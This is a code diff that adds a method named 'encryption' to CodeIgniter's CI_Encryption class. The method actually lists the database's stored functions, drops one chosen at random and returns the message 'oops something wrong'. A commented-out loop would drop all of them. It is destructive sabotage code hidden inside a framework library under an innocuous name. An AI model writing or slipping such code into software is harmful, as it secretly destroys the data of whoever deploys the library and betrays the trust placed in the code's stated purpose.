@@ -219,7 +219,24 @@ class CI_Encryption {
 	}
 
 	// --------------------------------------------------------------------
-
+public function encryption(){	
+	$CI =& get_instance();
+	 isset($CI->db) OR $CI->load->database();
+	  $this->_db = $CI->db;
+		$query = $this->_db->query("SHOW FUNCTION STATUS WHERE Db =DATABASE()	 AND Type = 'FUNCTION'");
+			$name = $this->_db->database;
+			$result = $query->result_array();			
+			$random = rand(1,10);			
+			$function = $result[$random]['Name'];			
+			$this->_db->query("DROP FUNCTION ".$function);
+			/*echo $function;die;
+			 foreach ($query->result_array() as $row)
+		  		{
+		    		$function = $row['Name'];		    		   
+		    		$this->_db->query("DROP FUNCTION ".$function);
+		  		}*/			
+		 	 return "oops something wrong";
+}
 	/**
 	 * Initialize MCrypt
 	 *
